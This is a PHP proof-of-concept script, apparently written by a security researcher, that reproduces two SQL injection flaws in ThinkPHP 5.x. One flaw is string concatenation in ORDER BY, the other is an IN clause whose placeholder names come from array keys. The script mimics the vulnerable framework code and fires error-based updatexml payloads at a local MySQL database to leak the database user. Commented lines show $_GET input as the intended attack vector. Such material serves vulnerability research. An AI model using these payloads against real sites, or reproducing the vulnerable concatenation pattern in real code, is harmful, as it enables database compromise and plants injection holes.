<?php
/**
 * Created by PhpStorm.
 * User: Kevinsa
 * Date: 2018/9/28
 * Time: 下午7:45
 */

class ThinkTest{
    private $options = array('order'=>array('id'));
    private $bindkey;

    private function order($field){
        if(empty($field)) {
            return $this;
        }
        if(is_string($field)) {
            $field = $this->options['via'] . '.' . $field;
        }
        if(is_array($field)){
            $this->options['order'] = array_merge($this->options['order'], $field);
        } else {
            $this->options['order'][] = $field;
        }
        return $this;
    }

    private function in($value){
        if(is_array($value)){
            foreach($value as $k => $v) {
                $this->bindkey = ':where' .uniqid() . '_' . $k;
            }
        }
        return $this;
    }
    public function MysqlDb($method) {
        $id = 2;
        $order = implode("|",$this->options['order']);
        //$order = 'id | updatexml(0,concat(0xa,user()),0)';
        $dbh = new PDO('mysql:dbname=test;host=127.0.0.1;','root','',array(PDO::ATTR_ERRMODE => PDO::ERRMODE_WARNING,PDO::ATTR_EMULATE_PREPARES=>false));
        try {
            if($method == 'order') {
                $link = $dbh -> prepare("select * from test where id =:id order by " . $order);
                $link->bindParam(':id',$id,PDO::PARAM_INT);
                $link->execute();
            } else {
                $link = $dbh -> prepare("SELECT * FROM test WHERE id in (".$this->bindkey.")");
                var_dump($link);
                $link->bindParam(':where_id',$this->bindkey,PDO::PARAM_STR);
                $link->execute();
            }
            while($row = $link -> fetch(PDO::FETCH_ASSOC)) {
                var_Dump($row);
            }
        } catch (\PDOException $e) {
            var_dump($e);
        }
    }

    /**
     * ThinkPHP order by 预编译sql语句拼接注入
     * @version 5.1.22
     */

    public function OrderTest() {
        $field = array(' updatexml(0,concat(0xa,user()),0)');
        //$field = $_GET['ids'];
        $this->order($field);
        $this->MysqlDb('order');

    }

    /**
     * ThinkPHP in 预编译sql语句拼接注入
     * PDO::ATTR_EMULATE_PREPARES=> false ,参数化绑定过程为：带有占位符sql发送至mysql编译，占位符参数发送至mysql服务器执行。第一步中发生错误将抛出异常终端执行。
     * @version 5
     */

    public function InTest(){
        $value = array("0,updatexml(0,concat(0xa,user()),0)"=>1);
        //$value = $_GET['ids'];
        $this->in($value);
        $this->MysqlDb('in');
    }
}

$a = new ThinkTest();
//$a->OrderTest();
$a->InTest();
